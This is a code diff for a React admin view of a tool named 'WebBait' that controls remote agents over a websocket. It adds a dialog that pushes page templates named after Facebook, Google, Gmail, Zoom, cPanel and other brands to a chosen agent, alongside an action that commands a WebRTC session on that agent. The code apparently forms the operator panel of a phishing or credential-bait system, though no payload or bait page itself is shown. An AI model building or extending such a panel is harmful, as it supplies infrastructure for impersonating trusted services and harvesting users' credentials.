@@ -1,4 +1,4 @@
-import { Button, ButtonGroup, ClickAwayListener, Dialog, DialogActions, DialogContent, DialogTitle, Grid, Grow, IconButton, MenuItem, MenuList, Paper, Popper, Stack, Table, TableBody, TableCell, TableContainer, TableRow, Tooltip, Typography, useTheme } from '@mui/material';
+import { Button, ButtonGroup, ClickAwayListener, Dialog, DialogActions, DialogContent, DialogTitle, FormControl, Grid, Grow, IconButton, InputLabel, MenuItem, MenuList, Paper, Popper, Select, Stack, Table, TableBody, TableCell, TableContainer, TableRow, Tooltip, Typography, useTheme } from '@mui/material';
 import _ from 'lodash';
 import React, { FC, useEffect, useRef, useState } from 'react';
 import { useTranslation } from 'react-i18next';
@@ -15,9 +15,10 @@ import { useTitle } from 'react-use';
 import { AgentCommandResults, AgentCommands, Agents } from '../models';
 import { FETCH_AGENTS_ACTION, FETCH_AGENT_COMMANDS_ACTION, RootState, UPDATE_AGENT, UPDATE_AGENT_COMMAND } from '../redux';
 import { connectAdminWebsocket, websocketService } from '../services';
-import { DataGrid, GridColDef } from '@mui/x-data-grid';
+import { DataGrid, GridColDef, GridSortItem } from '@mui/x-data-grid';
 import moment from "moment";
 import { useSnackbar } from 'notistack';
+import { Socket } from 'socket.io-client';
 
 export type AgentConnection = {
   agentId: string;
@@ -35,11 +36,74 @@ export type ActionsButtonOption = {
   enabled?: boolean | (() => boolean);
 }
 
+export type PickTemplateDialogProps = {
+  open: boolean;
+  onClose: () => void;
+  websocketService: Socket;
+  agent: Agents;
+}
+
+export const PickTemplateDialog: FC<PickTemplateDialogProps> = ({ websocketService, open, agent, onClose }) => {
+  const { t } = useTranslation();
+  const dispatch = useDispatch();
+  // const snackbar = useSnackbar();
+  const [template, setTemplate] = useState('');
+  const handleOnSubmit = () => {
+    websocketService.emit('cmd', {
+      cmd: 'set-template',
+      agentId: agent.agentId,
+      data: {
+        template,
+      }
+    });
+    dispatch(FETCH_AGENT_COMMANDS_ACTION({ include: ['result'] }, { id: agent.id }));
+    onClose();
+  }
+  const templates: string[] = [
+    'facebook',
+    'google',
+    'gmail',
+    'meet',
+    'youtube',
+    'messenger',
+    'cpanel',
+    'zoom',
+  ];
+  return (
+    <Dialog open={open} onClose={onClose} fullWidth>
+      <DialogTitle>{t('titles.pick_template')}</DialogTitle>
+      <DialogContent>
+        <Grid container spacing={2}>
+          <Grid item xs={12}>
+            <FormControl fullWidth>
+              <InputLabel id="template-select-label">{t('titles.pick_template')}</InputLabel>
+              <Select
+                label={t('titles.pick_template')}
+                labelId="template-select-label"
+                value={template}
+                onChange={(e) => setTemplate(e.target.value)}
+                fullWidth>
+                {templates.map(template => (
+                  <MenuItem key={template} value={template}>{t(`titles.templates.${template}`)}</MenuItem>
+                ))}
+              </Select>
+            </FormControl>
+          </Grid>
+        </Grid>
+      </DialogContent>
+      <DialogActions>
+        <Button color='inherit' onClick={onClose}>{t('cancel')}</Button>
+        <Button variant='contained' onClick={handleOnSubmit}>{t('ok')}</Button>
+      </DialogActions>
+    </Dialog>
+  );
+}
+
 export const ActionsButton: FC<{ options: ActionsButtonOption[] }> = ({ options }) => {
-  if (options.length === 0) return null;
   const [open, setOpen] = useState(false);
   const anchorRef = useRef<HTMLDivElement>(null);
   const [selectedIndex, setSelectedIndex] = useState(0);
+  if (options.length === 0) return null;
   const handleClick = () => {
     options[selectedIndex].action();
   };
@@ -167,18 +231,6 @@ export const AgentView = () => {
   useTitle(`WebBait - ${t('titles.agent')} ${agent && agent.id}`);
   const actionOptions: ActionsButtonOption[] = [
     {
-      label: 'Test command',
-      action: () => {
-        if (websocketService) {
-          websocketService.emit('cmd', {
-            cmd: 'test',
-            agentId,
-          });
-          agent && dispatch(FETCH_AGENT_COMMANDS_ACTION({ include: ['result'] }, { id: agent.id }));
-        }
-      },
-    },
-    {
       label: 'Command a WebRtc session',
       action: () => {
         if (websocketService) {
@@ -190,8 +242,15 @@ export const AgentView = () => {
         }
       },
       enabled: () => agent && agent.connected || false,
-    }
+    },
+    {
+      label: 'Set Template',
+      action: () => {
+        setPickTemplate(true);
+      },
+    },
   ];
+  const [pickTemplate, setPickTemplate] = useState(false);
   const columns: GridColDef[] = [
     { field: "id", headerName: "ID", width: 50 },
     { field: "cmdId", headerName: "Command ID", flex: 1 },
@@ -211,8 +270,10 @@ export const AgentView = () => {
     { field: "result", headerName: "Result", width: 100, renderCell: ({ value }) => (<>{value ? <IconButton color='primary' onClick={() => setShownResult(value)}><LaunchIcon /></IconButton> : <ClearIcon />}</>), hideSortIcons: true, disableColumnMenu: true },
   ];
   const [pageSize, setPageSize] = useState(15);
+  const [sortModel, setSortModel] = useState<GridSortItem[]>([{ field: 'cmdAt', sort: 'desc' }]);
   return (
     <Paper elevation={3} sx={{ p: 2, m: 2, height: '90vh' }}>
+      {pickTemplate && agent && websocketService && <PickTemplateDialog open={pickTemplate} onClose={() => setPickTemplate(false)} websocketService={websocketService} agent={agent} />}
       <Grid container spacing={2} direction='column' sx={{ height: '100%' }}>
         {!!!agent && !fetching && t('messages.agents.errors.no_such_agent')}
         {agent && <>
@@ -231,6 +292,8 @@ export const AgentView = () => {
             <DataGrid
               columns={columns}
               rows={cmds.map(cmd => _.omit(cmd, ['receivedAt', 'agentId']))}
+              sortModel={sortModel}
+              onSortModelChange={setSortModel}
               checkboxSelection
               onCellClick={(__, e) => { e.defaultMuiPrevented = true; }}
               pageSize={pageSize}
